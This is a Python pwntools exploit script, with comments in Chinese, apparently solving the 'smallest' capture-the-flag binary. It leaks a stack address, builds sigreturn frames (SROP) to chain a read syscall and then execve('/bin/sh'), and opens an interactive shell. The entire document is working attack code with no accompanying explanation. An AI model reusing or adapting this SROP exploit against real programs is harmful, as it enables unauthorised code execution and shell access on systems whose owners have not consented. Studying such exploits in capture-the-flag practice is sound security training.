from pwn import *


def start_process(file_path):
    """
    启动进程
    """
    return process(file_path)


def leak_stack_address(sh, start_address):
    """
    sh: 通信句柄
    start_address: 起始地址
    """
    sh.send(p64(start_address) * 3)
    sh.send(b"\xb3")
    stack_address = u64(sh.recv()[8:16])
    log.success(f"Leaked stack address: {hex(stack_address)}")
    return stack_address


def construct_sigreturn_frame(
    syscall_number, arg1, arg2, arg3, stack_address, syscall_ret
):
    """
    syscall_number: 系统调用号
    arg1, arg2, arg3: 系统调用的参数
    stack_address: 栈地址
    syscall_ret: 系统调用返回地址
    """
    frame = SigreturnFrame()
    frame.rax = syscall_number
    frame.rdi = arg1
    frame.rsi = arg2
    frame.rdx = arg3
    frame.rsp = stack_address
    frame.rip = syscall_ret
    return frame


def send_payload(sh, payload):
    """
    发送payload
    sh: 与目标程序的通信句柄
    payload: 要发送的palyload
    """
    try:
        sh.send(payload)
    except Exception as e:
        log.error(f"Error sending payload: {e}")


def main():
    context.arch = "amd64"
    context.log_level = "error"

    syscall_return_address = 0x00000000004000BE
    start_address = 0x00000000004000B0

    sh = start_process("./smallest")

    stack_address = leak_stack_address(sh, start_address)

    sigframe = construct_sigreturn_frame(
        constants.SYS_read,
        0,
        stack_address,
        0x400,
        stack_address,
        syscall_return_address,
    )
    payload = p64(start_address) + b"a" * 8 + bytes(sigframe)
    send_payload(sh, payload)

    sigreturn_payload = p64(syscall_return_address) + b"b" * 7
    send_payload(sh, sigreturn_payload)

    # 调用execve("/bin/sh", 0, 0)
    sigframe = construct_sigreturn_frame(
        constants.SYS_execve,
        stack_address + 0x120,
        0x0,
        0x0,
        stack_address,
        syscall_return_address,
    )
    frame_payload = p64(start_address) + b"b" * 8 + bytes(sigframe)
    final_payload = (
        frame_payload + (0x120 - len(frame_payload)) * b"\x00" + b"/bin/sh\x00"
    )
    send_payload(sh, final_payload)
    send_payload(sh, sigreturn_payload)

    sh.interactive()


if __name__ == "__main__":
    main()
